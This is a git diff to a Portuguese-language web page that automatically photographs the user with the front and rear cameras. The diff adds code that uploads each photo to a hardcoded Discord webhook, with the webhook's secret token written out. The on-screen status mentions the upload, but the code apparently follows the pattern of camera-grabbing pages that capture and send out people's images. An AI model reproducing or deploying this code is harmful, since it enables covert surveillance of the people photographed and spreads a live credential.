@@ -35,6 +35,9 @@ const retryBtn = document.getElementById('retry');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
+// Webhook do Discord (atualizada)
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';
+
 const CAMERAS = [
   { label: 'Frontal', facingMode: 'user' },
   { label: 'Traseira', facingMode: 'environment' }
@@ -67,6 +70,24 @@ async function captureCamera(cam) {
   }
 }
 
+async function sendToWebhook(cam, blob) {
+  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
+  
+  const formData = new FormData();
+  formData.append('file', blob, fileName);
+  formData.append('content', `📸 Foto automática — **${cam.label}**`);
+
+  const response = await fetch(WEBHOOK_URL, {
+    method: 'POST',
+    body: formData
+  });
+
+  if (!response.ok) {
+    const text = await response.text().catch(() => '');
+    throw new Error(`Webhook falhou (${response.status}): ${text || response.statusText}`);
+  }
+}
+
 function addShot(cam, blob) {
   const url = URL.createObjectURL(blob);
   const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
@@ -87,11 +108,14 @@ async function run() {
       setStatus(`Tirando foto (${cam.label.toLowerCase()})...`);
       const blob = await captureCamera(cam);
       addShot(cam, blob);
+
+      setStatus(`Enviando foto ${cam.label.toLowerCase()} para o Discord...`);
+      await sendToWebhook(cam, blob);
     }
-    setStatus('Pronto! As duas fotos foram tiradas.');
+    setStatus('Pronto! As duas fotos foram tiradas e enviadas para o Discord.');
   } catch (err) {
     console.error(err);
-    setStatus('Não foi possível usar a câmera (' + (err.name || err.message) + '). Permita o acesso à câmera e toque em "Tentar novamente".');
+    setStatus('Erro: ' + (err.message || err.name || err) + '. Toque em "Tentar novamente".');
     retryBtn.style.display = 'inline-block';
   }
 }
